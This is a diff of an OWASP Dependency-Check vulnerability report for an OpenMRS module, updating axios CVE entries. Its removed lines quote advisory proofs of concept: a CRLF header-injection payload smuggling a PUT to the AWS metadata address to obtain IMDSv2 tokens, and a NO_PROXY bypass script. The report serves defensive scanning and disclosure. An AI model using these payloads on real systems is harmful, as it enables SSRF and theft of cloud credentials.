@@ -5,19 +5,19 @@
         "dataSource": [
 {
                 "name": "NVD API Last Checked",
-                "timestamp": "2026-04-13T12:40:14Z"
+                "timestamp": "2026-04-18T11:56:24Z"
             }
 ,{
                 "name": "NVD API Last Modified",
-                "timestamp": "2026-04-13T11:38:48Z"
+                "timestamp": "2026-04-18T10:16:12Z"
             }
 ,{
                 "name": "NVD Cache Last Checked",
-                "timestamp": "2026-04-13T12:40:14Z"
+                "timestamp": "2026-04-18T11:56:24Z"
             }
 ,{
                 "name": "NVD Cache Last Modified",
-                "timestamp": "2026-04-13T11:38:48Z"
+                "timestamp": "2026-04-18T10:16:12Z"
             }
         ]
 
@@ -25,7 +25,7 @@
     },
     "projectInfo": {
         "name": "openmrs-module-bedmanagement",
-        "reportDate": "2026-04-13T21:32:25.274573644Z",
+        "reportDate": "2026-04-18T13:36:13.279819473Z",
         "credits": {
             "NVD": "This product uses the NVD API but is not endorsed or certified by the NVD. This report contains data retrieved from the National Vulnerability Database: https://nvd.nist.gov",
             "CISA": "This report may contain data retrieved from the CISA Known Exploited Vulnerability Catalog: https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
@@ -50090,24 +50090,20 @@
             ,"vulnerabilities": [
  {
                 "source": "RETIREJS",
-                "name": "CVE-2025-62718",
+                "name": "CVE-2026-40175",
 "unscored": "true", "severity" : "critical",
                 "description": "",
                 "notes": "",
                 "references": [
  {
                         "source": "info"
-,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3p68-rc4w-qgx5","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3p68-rc4w-qgx5"                    }, {
-                        "source": "info"
-,"url": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc3986#section-3.2.2","name": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc3986#section-3.2.2"                    }, {
-                        "source": "info"
-,"url": "https:\/\/github.com\/axios\/axios\/pull\/10661","name": "https:\/\/github.com\/axios\/axios\/pull\/10661"                    }, {
-                        "source": "info"
 ,"url": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0","name": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0"                    }, {
                         "source": "info"
-,"url": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc1034#section-3.1","name": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc1034#section-3.1"                    }, {
+,"url": "https:\/\/github.com\/axios\/axios\/commit\/363185461b90b1b78845dc8a99a1f103d9b122a1","name": "https:\/\/github.com\/axios\/axios\/commit\/363185461b90b1b78845dc8a99a1f103d9b122a1"                    }, {
                         "source": "info"
-,"url": "https:\/\/github.com\/axios\/axios\/commit\/fb3befb6daac6cad26b2e54094d0f2d9e47f24df","name": "https:\/\/github.com\/axios\/axios\/commit\/fb3befb6daac6cad26b2e54094d0f2d9e47f24df"                    }                ],
+,"url": "https:\/\/github.com\/axios\/axios\/pull\/10660","name": "https:\/\/github.com\/axios\/axios\/pull\/10660"                    }, {
+                        "source": "info"
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-fvcv-3m26-pcqx","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-fvcv-3m26-pcqx"                    }                ],
                 "vulnerableSoftware": [
                 ]
                 }, {
@@ -50535,6 +50531,106 @@
                         "software": { 
                             "id":"cpe:2.3:a:axios:axios:1.5.1:*:*:*:*:node.js:*:*"
                         }
+                    }                ]
+                }, {
+                "source": "NVD",
+                "name": "CVE-2025-62718",
+                    "severity" : "MEDIUM",
+                    "cvssv3": {
+                        "baseScore": 9.9
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "LOW"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"scope": "CHANGED"
+                        ,"confidentialityImpact": "HIGH"
+                        ,"integrityImpact": "LOW"
+                        ,"availabilityImpact": "LOW"
+                        ,"baseSeverity": "CRITICAL"
+,"exploitabilityScore": "3.9","impactScore": "5.3","version": "3.1"                    },
+                    "cvssv4": {
+                        "vectorString": "CVSS:4.0\/AV:N\/AC:L\/AT:P\/PR:N\/UI:N\/VC:L\/VI:L\/VA:N\/SC:L\/SI:L\/SA:N\/E:X\/CR:X\/IR:X\/AR:X\/MAV:X\/MAC:X\/MAT:X\/MPR:X\/MUI:X\/MVC:X\/MVI:X\/MVA:X\/MSC:X\/MSI:X\/MSA:X\/S:X\/AU:X\/R:X\/V:X\/RE:X\/U:X"
+                        ,"source": "security-advisories@github.com"
+                        ,"type": "Secondary"
+                        ,"version": "4.0"
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "LOW"
+                        ,"attackRequirements": "PRESENT"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"vulnerableSystemConfidentiality": "LOW"
+                        ,"vulnerableSystemIntegrity": "LOW"
+                        ,"vulnerableSystemAvailability": "NONE"
+                        ,"subsequentSystemConfidentiality": "LOW"
+                        ,"subsequentSystemIntegrity": "LOW"
+                        ,"subsequentSystemAvailability": "NONE"
+                        ,"exploitMaturity": "NOT_DEFINED"
+                        ,"confidentialityRequirements": "NOT_DEFINED"
+                        ,"integrityRequirements": "NOT_DEFINED"
+                        ,"availabilityRequirements": "NOT_DEFINED"
+                        ,"modifiedAttackVector": "NOT_DEFINED"
+                        ,"modifiedAttackComplexity": "NOT_DEFINED"
+                        ,"modifiedAttackRequirements": "NOT_DEFINED"
+                        ,"modifiedPrivilegesRequired": "NOT_DEFINED"
+                        ,"modifiedUserInteraction": "NOT_DEFINED"
+                        ,"modifiedVulnerableSystemConfidentiality": "NOT_DEFINED"
+                        ,"modifiedVulnerableSystemIntegrity": "NOT_DEFINED"
+                        ,"modifiedVulnerableSystemAvailability": "NOT_DEFINED"
+                        ,"modifiedSubsequentSystemConfidentiality": "NOT_DEFINED"
+                        ,"modifiedSubsequentSystemIntegrity": "NOT_DEFINED"
+                        ,"modifiedSubsequentSystemAvailability": "NOT_DEFINED"
+                        ,"safety": "NOT_DEFINED"
+                        ,"automatable": "NOT_DEFINED"
+                        ,"recovery": "NOT_DEFINED"
+                        ,"valueDensity": "NOT_DEFINED"
+                        ,"vulnerabilityResponseEffort": "NOT_DEFINED"
+                        ,"providerUrgency": "NOT_DEFINED"
+                        ,"baseScore": 6.3
+                        ,"baseSeverity": "MEDIUM"
+                    },
+                    "cwes": [
+                        "CWE-918",                        "CWE-441"                    ],
+                "description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.0 and 0.31.0, Axios does not correctly handle hostname normalization when checking NO_PROXY rules. Requests to loopback addresses like localhost. (with a trailing dot) or [::1] (IPv6 literal) skip NO_PROXY matching and go through the configured proxy. This goes against what developers expect and lets attackers force requests through a proxy, even if NO_PROXY is set up to protect loopback or internal services. This issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections. This vulnerability is fixed in 1.15.0 and 0.31.0.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/pull\/10688","name": "ISSUE_TRACKING"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/pull\/10661","name": "ISSUE_TRACKING,PATCH"                    }, {
+                        "source": "info"
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3p68-rc4w-qgx5","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3p68-rc4w-qgx5"                    }, {
+                        "source": "info"
+,"url": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc3986#section-3.2.2","name": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc3986#section-3.2.2"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/commit\/03cdfc99e8db32a390e12128208b6778492cee9c","name": "PATCH"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0","name": "PRODUCT,RELEASE_NOTES"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc3986#section-3.2.2","name": "TECHNICAL_DESCRIPTION"                    }, {
+                        "source": "info"
+,"url": "https:\/\/github.com\/axios\/axios\/pull\/10661","name": "https:\/\/github.com\/axios\/axios\/pull\/10661"                    }, {
+                        "source": "info"
+,"url": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0","name": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0"                    }, {
+                        "source": "info"
+,"url": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc1034#section-3.1","name": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc1034#section-3.1"                    }, {
+                        "source": "134c704f-9b21-4f2e-91b3-4a467353bcc0"
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3p68-rc4w-qgx5","name": "EXPLOIT,MITIGATION,VENDOR_ADVISORY"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc1034#section-3.1","name": "TECHNICAL_DESCRIPTION"                    }, {
+                        "source": "info"
+,"url": "https:\/\/github.com\/axios\/axios\/commit\/fb3befb6daac6cad26b2e54094d0f2d9e47f24df","name": "https:\/\/github.com\/axios\/axios\/commit\/fb3befb6daac6cad26b2e54094d0f2d9e47f24df"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3p68-rc4w-qgx5","name": "EXPLOIT,MITIGATION,VENDOR_ADVISORY"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/commit\/fb3befb6daac6cad26b2e54094d0f2d9e47f24df","name": "PATCH"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v0.31.0","name": "RELEASE_NOTES"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:axios:axios:*:*:*:*:*:node.js:*:*"
+,"versionEndExcluding":"1.15.0"                        }
                     }                ]
                 }, {
                 "source": "NVD",
@@ -50692,24 +50788,20 @@
             ,"vulnerabilities": [
  {
                 "source": "RETIREJS",
-                "name": "CVE-2025-62718",
+                "name": "CVE-2026-40175",
 "unscored": "true", "severity" : "critical",
                 "description": "",
                 "notes": "",
                 "references": [
  {
                         "source": "info"
-,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3p68-rc4w-qgx5","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3p68-rc4w-qgx5"                    }, {
-                        "source": "info"
-,"url": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc3986#section-3.2.2","name": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc3986#section-3.2.2"                    }, {
-                        "source": "info"
-,"url": "https:\/\/github.com\/axios\/axios\/pull\/10661","name": "https:\/\/github.com\/axios\/axios\/pull\/10661"                    }, {
-                        "source": "info"
 ,"url": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0","name": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0"                    }, {
                         "source": "info"
-,"url": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc1034#section-3.1","name": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc1034#section-3.1"                    }, {
+,"url": "https:\/\/github.com\/axios\/axios\/commit\/363185461b90b1b78845dc8a99a1f103d9b122a1","name": "https:\/\/github.com\/axios\/axios\/commit\/363185461b90b1b78845dc8a99a1f103d9b122a1"                    }, {
                         "source": "info"
-,"url": "https:\/\/github.com\/axios\/axios\/commit\/fb3befb6daac6cad26b2e54094d0f2d9e47f24df","name": "https:\/\/github.com\/axios\/axios\/commit\/fb3befb6daac6cad26b2e54094d0f2d9e47f24df"                    }                ],
+,"url": "https:\/\/github.com\/axios\/axios\/pull\/10660","name": "https:\/\/github.com\/axios\/axios\/pull\/10660"                    }, {
+                        "source": "info"
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-fvcv-3m26-pcqx","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-fvcv-3m26-pcqx"                    }                ],
                 "vulnerableSoftware": [
                 ]
                 }, {
@@ -51137,6 +51229,106 @@
                         "software": { 
                             "id":"cpe:2.3:a:axios:axios:1.5.1:*:*:*:*:node.js:*:*"
                         }
+                    }                ]
+                }, {
+                "source": "NVD",
+                "name": "CVE-2025-62718",
+                    "severity" : "MEDIUM",
+                    "cvssv3": {
+                        "baseScore": 9.9
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "LOW"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"scope": "CHANGED"
+                        ,"confidentialityImpact": "HIGH"
+                        ,"integrityImpact": "LOW"
+                        ,"availabilityImpact": "LOW"
+                        ,"baseSeverity": "CRITICAL"
+,"exploitabilityScore": "3.9","impactScore": "5.3","version": "3.1"                    },
+                    "cvssv4": {
+                        "vectorString": "CVSS:4.0\/AV:N\/AC:L\/AT:P\/PR:N\/UI:N\/VC:L\/VI:L\/VA:N\/SC:L\/SI:L\/SA:N\/E:X\/CR:X\/IR:X\/AR:X\/MAV:X\/MAC:X\/MAT:X\/MPR:X\/MUI:X\/MVC:X\/MVI:X\/MVA:X\/MSC:X\/MSI:X\/MSA:X\/S:X\/AU:X\/R:X\/V:X\/RE:X\/U:X"
+                        ,"source": "security-advisories@github.com"
+                        ,"type": "Secondary"
+                        ,"version": "4.0"
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "LOW"
+                        ,"attackRequirements": "PRESENT"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"vulnerableSystemConfidentiality": "LOW"
+                        ,"vulnerableSystemIntegrity": "LOW"
+                        ,"vulnerableSystemAvailability": "NONE"
+                        ,"subsequentSystemConfidentiality": "LOW"
+                        ,"subsequentSystemIntegrity": "LOW"
+                        ,"subsequentSystemAvailability": "NONE"
+                        ,"exploitMaturity": "NOT_DEFINED"
+                        ,"confidentialityRequirements": "NOT_DEFINED"
+                        ,"integrityRequirements": "NOT_DEFINED"
+                        ,"availabilityRequirements": "NOT_DEFINED"
+                        ,"modifiedAttackVector": "NOT_DEFINED"
+                        ,"modifiedAttackComplexity": "NOT_DEFINED"
+                        ,"modifiedAttackRequirements": "NOT_DEFINED"
+                        ,"modifiedPrivilegesRequired": "NOT_DEFINED"
+                        ,"modifiedUserInteraction": "NOT_DEFINED"
+                        ,"modifiedVulnerableSystemConfidentiality": "NOT_DEFINED"
+                        ,"modifiedVulnerableSystemIntegrity": "NOT_DEFINED"
+                        ,"modifiedVulnerableSystemAvailability": "NOT_DEFINED"
+                        ,"modifiedSubsequentSystemConfidentiality": "NOT_DEFINED"
+                        ,"modifiedSubsequentSystemIntegrity": "NOT_DEFINED"
+                        ,"modifiedSubsequentSystemAvailability": "NOT_DEFINED"
+                        ,"safety": "NOT_DEFINED"
+                        ,"automatable": "NOT_DEFINED"
+                        ,"recovery": "NOT_DEFINED"
+                        ,"valueDensity": "NOT_DEFINED"
+                        ,"vulnerabilityResponseEffort": "NOT_DEFINED"
+                        ,"providerUrgency": "NOT_DEFINED"
+                        ,"baseScore": 6.3
+                        ,"baseSeverity": "MEDIUM"
+                    },
+                    "cwes": [
+                        "CWE-918",                        "CWE-441"                    ],
+                "description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.0 and 0.31.0, Axios does not correctly handle hostname normalization when checking NO_PROXY rules. Requests to loopback addresses like localhost. (with a trailing dot) or [::1] (IPv6 literal) skip NO_PROXY matching and go through the configured proxy. This goes against what developers expect and lets attackers force requests through a proxy, even if NO_PROXY is set up to protect loopback or internal services. This issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections. This vulnerability is fixed in 1.15.0 and 0.31.0.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/pull\/10688","name": "ISSUE_TRACKING"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/pull\/10661","name": "ISSUE_TRACKING,PATCH"                    }, {
+                        "source": "info"
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3p68-rc4w-qgx5","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3p68-rc4w-qgx5"                    }, {
+                        "source": "info"
+,"url": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc3986#section-3.2.2","name": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc3986#section-3.2.2"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/commit\/03cdfc99e8db32a390e12128208b6778492cee9c","name": "PATCH"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0","name": "PRODUCT,RELEASE_NOTES"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc3986#section-3.2.2","name": "TECHNICAL_DESCRIPTION"                    }, {
+                        "source": "info"
+,"url": "https:\/\/github.com\/axios\/axios\/pull\/10661","name": "https:\/\/github.com\/axios\/axios\/pull\/10661"                    }, {
+                        "source": "info"
+,"url": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0","name": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0"                    }, {
+                        "source": "info"
+,"url": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc1034#section-3.1","name": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc1034#section-3.1"                    }, {
+                        "source": "134c704f-9b21-4f2e-91b3-4a467353bcc0"
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3p68-rc4w-qgx5","name": "EXPLOIT,MITIGATION,VENDOR_ADVISORY"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc1034#section-3.1","name": "TECHNICAL_DESCRIPTION"                    }, {
+                        "source": "info"
+,"url": "https:\/\/github.com\/axios\/axios\/commit\/fb3befb6daac6cad26b2e54094d0f2d9e47f24df","name": "https:\/\/github.com\/axios\/axios\/commit\/fb3befb6daac6cad26b2e54094d0f2d9e47f24df"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3p68-rc4w-qgx5","name": "EXPLOIT,MITIGATION,VENDOR_ADVISORY"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/commit\/fb3befb6daac6cad26b2e54094d0f2d9e47f24df","name": "PATCH"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v0.31.0","name": "RELEASE_NOTES"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:axios:axios:*:*:*:*:*:node.js:*:*"
+,"versionEndExcluding":"1.15.0"                        }
                     }                ]
                 }, {
                 "source": "NVD",
@@ -51318,46 +51510,6 @@
             ]
             ,"vulnerabilities": [
  {
-                "source": "NPM",
-                "name": "GHSA-fvcv-3m26-pcqx",
-"unscored": "true", "severity" : "critical",
-                    "cvssv3": {
-                        "baseScore": 10.0
-                        ,"attackVector": "NETWORK"
-                        ,"attackComplexity": "LOW"
-                        ,"privilegesRequired": "NONE"
-                        ,"userInteraction": "NONE"
-                        ,"scope": "CHANGED"
-                        ,"confidentialityImpact": "HIGH"
-                        ,"integrityImpact": "HIGH"
-                        ,"availabilityImpact": "HIGH"
-                        ,"baseSeverity": "CRITICAL"
-,"version": "3.1"                    },
-                    "cwes": [
-                        "CWE-444",                        "CWE-918",                        "CWE-113"                    ],
-                "description": "# Vulnerability Disclosure: Unrestricted Cloud Metadata Exfiltration via Header Injection Chain\n\n## Summary\nThe Axios library is vulnerable to a specific \"Gadget\" attack chain that allows **Prototype Pollution** in any third-party dependency to be escalated into **Remote Code Execution (RCE)** or **Full Cloud Compromise** (via AWS IMDSv2 bypass).\n\nWhile Axios patches exist for *preventing check* pollution, the library remains vulnerable to *being used* as a gadget when pollution occurs elsewhere. This is due to a lack of HTTP Header Sanitization (CWE-113) combined with default SSRF capabilities.\n\n**Severity**: Critical (CVSS 9.9)\n**Affected Versions**: All versions (v0.x - v1.x)\n**Vulnerable Component**: `lib\/adapters\/http.js` (Header Processing)\n\n## Usage of \"Helper\" Vulnerabilities\nThis vulnerability is unique because it requires **Zero Direct User Input**.\nIf an attacker can pollute `Object.prototype` via *any* other library in the stack (e.g., `qs`, `minimist`, `ini`, `body-parser`), Axios will automatically pick up the polluted properties during its config merge.\n\nBecause Axios does not sanitise these merged header values for CRLF (`\\r\\n`) characters, the polluted property becomes a **Request Smuggling** payload.\n\n## Proof of Concept\n\n### 1. The Setup (Simulated Pollution)\nImagine a scenario where a known vulnerability exists in a query parser. The attacker sends a payload that sets:\n```javascript\nObject.prototype['x-amz-target'] = \"dummy\\r\\n\\r\\nPUT \/latest\/api\/token HTTP\/1.1\\r\\nHost: 169.254.169.254\\r\\nX-aws-ec2-metadata-token-ttl-seconds: 21600\\r\\n\\r\\nGET \/ignore\";\n```\n\n### 2. The Gadget Trigger (Safe Code)\nThe application makes a completely safe, hardcoded request:\n```javascript\n\/\/ This looks safe to the developer\nawait axios.get('https:\/\/analytics.internal\/pings'); \n```\n\n### 3. The Execution\nAxios merges the prototype property `x-amz-target` into the request headers. It then writes the header value directly to the socket without validation.\n\n**Resulting HTTP traffic:**\n```http\nGET \/pings HTTP\/1.1\nHost: analytics.internal\nx-amz-target: dummy\n\nPUT \/latest\/api\/token HTTP\/1.1\nHost: 169.254.169.254\nX-aws-ec2-metadata-token-ttl-seconds: 21600\n\nGET \/ignore HTTP\/1.1\n...\n```\n\n### 4. The Impact (IMDSv2 Bypass)\nThe \"Smuggled\" second request is a valid `PUT` request to the AWS Metadata Service. It includes the required `X-aws-ec2-metadata-token-ttl-seconds` header (which a normal SSRF cannot send).\nThe Metadata Service returns a session token, allowing the attacker to steal IAM credentials and compromise the cloud account.\n\n## Impact Analysis\n-   **Security Control Bypass**: Defeats AWS IMDSv2 (Session Tokens).\n-   **Authentication Bypass**: Can inject headers (`Cookie`, `Authorization`) to pivot into internal administrative panels.\n-   **Cache Poisoning**: Can inject `Host` headers to poison shared caches.\n\n## Recommended Fix\nValidate all header values in `lib\/adapters\/http.js` and `xhr.js` before passing them to the underlying request function.\n\n**Patch Suggestion:**\n```javascript\n\/\/ In lib\/adapters\/http.js\nutils.forEach(requestHeaders, function setRequestHeader(val, key) {\n  if (\/[\\r\\n]\/.test(val)) {\n    throw new Error('Security: Header value contains invalid characters');\n  }\n  \/\/ ... proceed to set header\n});\n```\n\n## References\n-   **OWASP**: CRLF Injection (CWE-113)\n\nThis report was generated as part of a security audit of the Axios library.",
-                "notes": "",
-                "references": [
- {
-                        "source": "NPM Advisory reference: "
-,"url": "https:\/\/github.com\/axios\/axios\/pull\/10660","name": "https:\/\/github.com\/axios\/axios\/pull\/10660"                    }, {
-                        "source": "NPM Advisory reference: "
-,"url": "https:\/\/github.com\/advisories\/GHSA-fvcv-3m26-pcqx","name": "https:\/\/github.com\/advisories\/GHSA-fvcv-3m26-pcqx"                    }, {
-                        "source": "NPM Advisory reference: "
-,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-fvcv-3m26-pcqx","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-fvcv-3m26-pcqx"                    }, {
-                        "source": "NPM Advisory reference: "
-,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-40175","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-40175"                    }, {
-                        "source": "NPM Advisory reference: "
-,"url": "https:\/\/github.com\/axios\/axios\/commit\/363185461b90b1b78845dc8a99a1f103d9b122a1","name": "https:\/\/github.com\/axios\/axios\/commit\/363185461b90b1b78845dc8a99a1f103d9b122a1"                    }, {
-                        "source": "NPM Advisory reference: "
-,"url": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0","name": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0"                    }                ],
-                "vulnerableSoftware": [
- {
-                        "software": { 
-                            "id":"cpe:2.3:a:*:axios:\\<1.15.0:*:*:*:*:*:*:*"
-                        }
-                    }                ]
-                }, {
                 "source": "NVD",
                 "name": "CVE-2024-57965",
                     "severity" : "CRITICAL",
@@ -51392,38 +51544,6 @@
                         "software": { 
                             "id":"cpe:2.3:a:axios:axios:*:*:*:*:*:node.js:*:*"
 ,"vulnerabilityIdMatched":"true","versionEndExcluding":"1.7.8"                        }
-                    }                ]
-                }, {
-                "source": "NPM",
-                "name": "GHSA-3p68-rc4w-qgx5",
-"unscored": "true", "severity" : "critical",
-                    "cwes": [
-                        "CWE-918",                        "CWE-441"                    ],
-                "description": "Axios does not correctly handle hostname normalization when checking `NO_PROXY` rules.\nRequests to loopback addresses like `localhost.` (with a trailing dot) or `[::1]` (IPv6 literal) skip `NO_PROXY` matching and go through the configured proxy.\n\nThis goes against what developers expect and lets attackers force requests through a proxy, even if `NO_PROXY` is set up to protect loopback or internal services.\n\nAccording to [RFC 1034 \u00A73.1](https:\/\/datatracker.ietf.org\/doc\/html\/rfc1034#section-3.1) and [RFC 3986 \u00A73.2.2](https:\/\/datatracker.ietf.org\/doc\/html\/rfc3986#section-3.2.2), a hostname can have a trailing dot to show it is a fully qualified domain name (FQDN). At the DNS level, `localhost.` is the same as `localhost`. \nHowever, Axios does a literal string comparison instead of normalizing hostnames before checking `NO_PROXY`. This causes requests like `http:\/\/localhost.:8080\/` and `http:\/\/[::1]:8080\/` to be incorrectly proxied.\n\nThis issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections.\n\n---\n\n**PoC**\n\n```js\nimport http from \"http\";\nimport axios from \"axios\";\n\nconst proxyPort = 5300;\n\nhttp.createServer((req, res) => {\n  console.log(\"[PROXY] Got:\", req.method, req.url, \"Host:\", req.headers.host);\n  res.writeHead(200, { \"Content-Type\": \"text\/plain\" });\n  res.end(\"proxied\");\n}).listen(proxyPort, () => console.log(\"Proxy\", proxyPort));\n\nprocess.env.HTTP_PROXY = `http:\/\/127.0.0.1:${proxyPort}`;\nprocess.env.NO_PROXY = \"localhost,127.0.0.1,::1\";\n\nasync function test(url) {\n  try {\n    await axios.get(url, { timeout: 2000 });\n  } catch {}\n}\n\nsetTimeout(async () => {\n  console.log(\"\\n[*] Testing http:\/\/localhost.:8080\/\");\n  await test(\"http:\/\/localhost.:8080\/\"); \/\/ goes through proxy\n\n  console.log(\"\\n[*] Testing http:\/\/[::1]:8080\/\");\n  await test(\"http:\/\/[::1]:8080\/\"); \/\/ goes through proxy\n}, 500);\n```\n\n**Expected:** Requests bypass the proxy (direct to loopback).\n**Actual:** Proxy logs requests for `localhost.` and `[::1]`.\n\n---\n\n**Impact**\n\n* Applications that rely on `NO_PROXY=localhost,127.0.0.1,::1` for protecting loopback\/internal access are vulnerable.\n* Attackers controlling request URLs can:\n\n  * Force Axios to send local traffic through an attacker-controlled proxy.\n  * Bypass SSRF mitigations relying on NO\\_PROXY rules.\n  * Potentially exfiltrate sensitive responses from internal services via the proxy.\n  \n  \n---\n\n**Affected Versions**\n\n* Confirmed on Axios **1.12.2** (latest at time of testing).\n* affects all versions that rely on Axios\u2019 current `NO_PROXY` evaluation.\n\n---\n\n**Remediation**\nAxios should normalize hostnames before evaluating `NO_PROXY`, including:\n\n* Strip trailing dots from hostnames (per RFC 3986).\n* Normalize IPv6 literals by removing brackets for matching.",
-                "notes": "",
-                "references": [
- {
-                        "source": "NPM Advisory reference: "
-,"url": "https:\/\/github.com\/axios\/axios\/commit\/fb3befb6daac6cad26b2e54094d0f2d9e47f24df","name": "https:\/\/github.com\/axios\/axios\/commit\/fb3befb6daac6cad26b2e54094d0f2d9e47f24df"                    }, {
-                        "source": "NPM Advisory reference: "
-,"url": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc3986#section-3.2.2","name": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc3986#section-3.2.2"                    }, {
-                        "source": "NPM Advisory reference: "
-,"url": "https:\/\/github.com\/axios\/axios\/pull\/10661","name": "https:\/\/github.com\/axios\/axios\/pull\/10661"                    }, {
-                        "source": "NPM Advisory reference: "
-,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2025-62718","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2025-62718"                    }, {
-                        "source": "NPM Advisory reference: "
-,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3p68-rc4w-qgx5","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3p68-rc4w-qgx5"                    }, {
-                        "source": "NPM Advisory reference: "
-,"url": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc1034#section-3.1","name": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc1034#section-3.1"                    }, {
-                        "source": "NPM Advisory reference: "
-,"url": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0","name": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0"                    }, {
-                        "source": "NPM Advisory reference: "
